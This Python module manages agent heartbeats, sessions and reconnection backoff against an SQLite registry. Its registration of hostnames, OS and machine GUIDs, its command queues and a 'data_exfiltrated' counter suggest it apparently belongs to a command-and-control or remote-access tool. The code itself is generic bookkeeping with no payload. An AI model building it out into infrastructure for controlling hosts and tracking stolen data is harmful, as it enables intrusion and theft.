"""
═══════════════════════════════════════════════════════════════════════════
HEARTBEAT & SESSION MANAGER
Real-time agent-server communication with reconnection logic
═══════════════════════════════════════════════════════════════════════════
"""

import threading
import time
from typing import Dict, Optional, Callable
from datetime import datetime, timedelta
from agent_registry import AgentRegistry

class HeartbeatManager:
    """Manage agent heartbeats and detect offline agents"""
    
    def __init__(self, registry: AgentRegistry, timeout: int = 30):
        """Initialize heartbeat manager"""
        self.registry = registry
        self.timeout = timeout  # seconds before marking offline
        self.checking = False
        self.check_thread = None
        self.check_interval = 5  # seconds between checks
        self.callbacks = []  # Alert callbacks
    
    def subscribe(self, callback: Callable):
        """Subscribe to status change alerts"""
        self.callbacks.append(callback)
    
    def start(self):
        """Start heartbeat monitoring"""
        if self.checking:
            return
        
        self.checking = True
        self.check_thread = threading.Thread(target=self._check_loop, daemon=True)
        self.check_thread.start()
    
    def stop(self):
        """Stop heartbeat monitoring"""
        self.checking = False
        if self.check_thread:
            self.check_thread.join(timeout=2)
    
    def _check_loop(self):
        """Main heartbeat check loop"""
        while self.checking:
            try:
                import sqlite3
                
                with sqlite3.connect(self.registry.db_path) as conn:
                    cursor = conn.cursor()
                    
                    # Find sessions with stale heartbeats
                    cutoff_time = datetime.now() - timedelta(seconds=self.timeout)
                    
                    cursor.execute('''
                        SELECT session_id, agent_id FROM sessions
                        WHERE status = 'active' 
                        AND last_heartbeat < ?
                    ''', (cutoff_time.isoformat(),))
                    
                    stale_sessions = cursor.fetchall()
                    
                    for session_id, agent_id in stale_sessions:
                        # Mark agent as offline
                        cursor.execute('''
                            UPDATE agents SET status = 'offline' 
                            WHERE agent_id = ?
                        ''', (agent_id,))
                        
                        # Mark session as inactive
                        cursor.execute('''
                            UPDATE sessions SET status = 'inactive'
                            WHERE session_id = ?
                        ''', (session_id,))
                        
                        # Trigger callback
                        self._alert('agent_offline', agent_id)
                    
                    conn.commit()
                
                time.sleep(self.check_interval)
            
            except Exception as e:
                print(f"[HeartbeatManager] Error: {e}")
                time.sleep(self.check_interval)
    
    def _alert(self, event_type: str, agent_id: str):
        """Trigger alert callbacks"""
        for callback in self.callbacks:
            try:
                callback({
                    'type': event_type,
                    'agent_id': agent_id,
                    'timestamp': datetime.now().isoformat()
                })
            except Exception as e:
                print(f"[HeartbeatManager] Callback error: {e}")


class SessionManager:
    """Manage agent sessions and connections"""
    
    def __init__(self, registry: AgentRegistry):
        """Initialize session manager"""
        self.registry = registry
        self.active_sessions = {}  # {session_id: socket_info}
        self.lock = threading.RLock()
    
    def create_session(self, agent_id: str, socket_info: Dict) -> str:
        """Create new session for agent"""
        with self.lock:
            session_id = self.registry.create_session(agent_id)
            
            self.active_sessions[session_id] = {
                'agent_id': agent_id,
                'socket': socket_info,
                'connected_at': datetime.now(),
                'bytes_sent': 0,
                'bytes_received': 0,
                'commands_queued': 0,
            }
            
            return session_id
    
    def get_session(self, session_id: str) -> Optional[Dict]:
        """Get active session info"""
        with self.lock:
            return self.active_sessions.get(session_id)
    
    def close_session(self, session_id: str):
        """Close session"""
        with self.lock:
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]
    
    def record_data(self, session_id: str, bytes_sent: int = 0, bytes_received: int = 0):
        """Record data transfer"""
        with self.lock:
            if session_id in self.active_sessions:
                session = self.active_sessions[session_id]
                session['bytes_sent'] += bytes_sent
                session['bytes_received'] += bytes_received
                
                # Update database
                import sqlite3
                with sqlite3.connect(self.registry.db_path) as conn:
                    cursor = conn.cursor()
                    cursor.execute('''
                        UPDATE sessions 
                        SET data_exfiltrated = data_exfiltrated + ?
                        WHERE session_id = ?
                    ''', (bytes_sent, session_id))
                    conn.commit()
    
    def get_all_sessions(self) -> Dict:
        """Get all active sessions"""
        with self.lock:
            return self.active_sessions.copy()
    
    def get_agent_sessions(self, agent_id: str) -> Dict:
        """Get sessions for specific agent"""
        with self.lock:
            return {
                sid: info for sid, info in self.active_sessions.items()
                if info['agent_id'] == agent_id
            }


class ReconnectionManager:
    """Handle agent reconnection attempts"""
    
    def __init__(self, registry: AgentRegistry, max_retries: int = 5):
        """Initialize reconnection manager"""
        self.registry = registry
        self.max_retries = max_retries
        self.reconnection_attempts = {}  # {agent_id: retry_count}
        self.lock = threading.RLock()
    
    def record_connection(self, agent_id: str, success: bool):
        """Record connection attempt"""
        with self.lock:
            if success:
                # Reset retry count
                self.reconnection_attempts[agent_id] = 0
                self.registry.update_last_activity(agent_id)
            else:
                # Increment retry count
                self.reconnection_attempts[agent_id] = \
                    self.reconnection_attempts.get(agent_id, 0) + 1
    
    def can_reconnect(self, agent_id: str) -> bool:
        """Check if agent can attempt reconnection"""
        with self.lock:
            attempts = self.reconnection_attempts.get(agent_id, 0)
            return attempts < self.max_retries
    
    def get_backoff_time(self, agent_id: str) -> int:
        """Calculate exponential backoff time"""
        with self.lock:
            attempts = self.reconnection_attempts.get(agent_id, 0)
            # 2^attempts seconds, capped at 300 seconds
            return min(2 ** attempts, 300)
    
    def reset(self, agent_id: str):
        """Reset reconnection counter"""
        with self.lock:
            self.reconnection_attempts[agent_id] = 0


if __name__ == '__main__':
    # Test the managers
    from agent_registry import AgentRegistry
    
    registry = AgentRegistry()
    
    # Test heartbeat manager
    hb = HeartbeatManager(registry)
    
    def alert_callback(event):
        print(f"✅ Alert: {event['type']} - {event['agent_id'][:8]}...")
    
    hb.subscribe(alert_callback)
    hb.start()
    
    print("✅ HeartbeatManager started")
    
    # Test session manager
    sm = SessionManager(registry)
    
    agent_id = registry.register_agent(
        hostname='TEST',
        os='Windows',
        ip='192.168.1.1',
        machine_guid='TEST-GUID'
    )
    
    session_id = sm.create_session(agent_id, {'socket': 'test'})
    print(f"✅ Session created: {session_id[:8]}...")
    
    # Test reconnection manager
    rm = ReconnectionManager(registry)
    
    rm.record_connection(agent_id, False)
    backoff = rm.get_backoff_time(agent_id)
    print(f"✅ Backoff time: {backoff}s")
    
    print("\n✅ All managers working correctly")
